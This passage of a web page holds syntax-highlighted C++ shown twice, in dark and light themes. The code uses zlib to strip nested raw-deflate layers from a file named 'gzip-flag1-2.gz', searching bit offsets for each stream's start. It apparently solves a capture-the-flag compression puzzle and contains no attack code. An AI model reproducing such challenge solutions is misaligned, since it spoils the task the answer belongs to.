<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">fread</span><span style="color: #D6DEEB">(in, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, CHUNK, input);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">fclose</span><span style="color: #D6DEEB">(input);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> in;</span></span>
<span></span>
<span><span style="color: #D6DEEB">    z_stream foo;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">foo</span><span style="color: #D6DEEB">.</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Z_NULL;</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> round </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; round </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">round)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">unsigned</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> commonHead </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> t </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">;; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">t)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> CHUNK;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> ret </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">inflate</span><span style="color: #D6DEEB">(s, Z_BLOCK);</span></span>
<span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (ret </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> Z_STREAM_END)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (ret </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> Z_OK)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">printf</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%d</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, t, ret);</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #82AAFF">assert</span><span style="color: #D6DEEB">(ret </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> Z_OK);</span></span>
<span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">const</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> unused_bits </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">data_type</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">unsigned</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> head </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB">[</span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">8</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> unused_bits);</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">unsigned</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">nxt </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">                head </span><span style="color: #C792EA">|=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">nxt</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">8</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> unused_bits);</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (commonHead </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">                commonHead </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> head;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (head </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> commonHead)</span></span>
<span><span style="color: #D6DEEB">            {</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> CHUNK;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">assert</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">inflate</span><span style="color: #D6DEEB">(s, Z_BLOCK) </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> Z_OK);</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">printf</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">different head: </span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%x</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%x</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, t, head, commonHead);</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">            }</span></span>
<span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (unused_bits </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&amp;&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">foo</span><span style="color: #D6DEEB">.</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> Z_NULL)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">inflateCopy</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">foo, s);</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> len;</span></span>
<span></span>
<span><span style="color: #D6DEEB">        len </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> CHUNK </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">memcpy</span><span style="color: #D6DEEB">(in, out, len);</span></span>
<span></span>
<span><span style="color: #D6DEEB">        FILE </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">output </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">fopen</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">output</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">wb</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">fwrite</span><span style="color: #D6DEEB">(out, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, len, output);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">fclose</span><span style="color: #D6DEEB">(output);</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> start </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">;</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> offset </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; offset </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">8</span><span style="color: #D6DEEB">; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">offset)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">8000</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&amp;&amp;</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> len; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">j)</span></span>
<span><span style="color: #D6DEEB">            {</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (j </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1000</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #82AAFF">printf</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">finding start: </span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%d</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, offset, j);</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">inflateEnd</span><span style="color: #D6DEEB">(s);</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #7FDBCA">delete</span><span style="color: #D6DEEB"> s;</span></span>
<span><span style="color: #D6DEEB">                s </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">new</span><span style="color: #D6DEEB"> z_stream;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">inflateCopy</span><span style="color: #D6DEEB">(s, </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">foo);</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> in </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> len </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> j;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> CHUNK;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #82AAFF">inflate</span><span style="color: #D6DEEB">(s, Z_BLOCK) </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> Z_OK)</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #C792EA">continue</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (CHUNK </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">10000</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #C792EA">continue</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> CHUNK;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> out;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #82AAFF">inflate</span><span style="color: #D6DEEB">(s, Z_BLOCK) </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> Z_OK)</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #C792EA">continue</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (CHUNK </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">10000</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">                    </span><span style="color: #C792EA">continue</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #82AAFF">printf</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">start: </span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%d</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">%llx</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">, j, CHUNK </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_out</span><span style="color: #D6DEEB">, offset,</span></span>
<span><span style="color: #D6DEEB">                       </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">unsigned</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)out);</span></span>
<span><span style="color: #D6DEEB">                start </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> j;</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">            }</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (start)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> len; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">                </span><span style="color: #C5E478">in</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C5E478">in</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">|</span><span style="color: #D6DEEB"> ((</span><span style="color: #C5E478">in</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (start </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #82AAFF">exit</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">);</span></span>
<span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">inflateEnd</span><span style="color: #D6DEEB">(s);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">inflateCopy</span><span style="color: #D6DEEB">(s, </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">foo);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">next_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> in </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> start;</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">-&gt;</span><span style="color: #7FDBCA">avail_in</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> len </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> start;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">zlib.h</span><span style="color: #111111">&gt;</span></span>
<span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cassert</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cstdio</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cstdlib</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cstring</span><span style="color: #111111">&gt;</span></span>
<span></span>
<span><span style="color: #994CC3">using</span><span style="color: #403F53"> </span><span style="color: #994CC3">namespace</span><span style="color: #403F53"> std;</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> CHUNK </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">28</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">unsigned</span><span style="color: #403F53"> </span><span style="color: #994CC3">char</span><span style="color: #403F53"> </span><span style="color: #4876D6">in</span><span style="color: #403F53">[CHUNK], </span><span style="color: #4876D6">out</span><span style="color: #403F53">[CHUNK];</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">main</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">auto</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">s </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">new</span><span style="color: #403F53"> z_stream;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">zalloc</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Z_NULL;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">zfree</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Z_NULL;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">opaque</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Z_NULL;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Z_NULL;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">inflateInit2</span><span style="color: #403F53">(s, </span><span style="color: #994CC3">-</span><span style="color: #AA0982">15</span><span style="color: #403F53">);</span></span>
<span></span>
<span><span style="color: #403F53">    FILE </span><span style="color: #994CC3">*</span><span style="color: #403F53">input </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">fopen</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">gzip-flag1-2.gz</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">rb</span><span style="color: #111111">&quot;</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">fseek</span><span style="color: #403F53">(input, </span><span style="color: #AA0982">10</span><span style="color: #403F53">, SEEK_SET);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">fread</span><span style="color: #403F53">(in, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, CHUNK, input);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">fclose</span><span style="color: #403F53">(input);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> in;</span></span>
<span></span>
<span><span style="color: #403F53">    z_stream foo;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">foo</span><span style="color: #403F53">.</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Z_NULL;</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> round </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; round </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">; </span><span style="color: #994CC3">++</span><span style="color: #403F53">round)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">unsigned</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> commonHead </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> t </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">;; </span><span style="color: #994CC3">++</span><span style="color: #403F53">t)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> CHUNK;</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> out;</span></span>
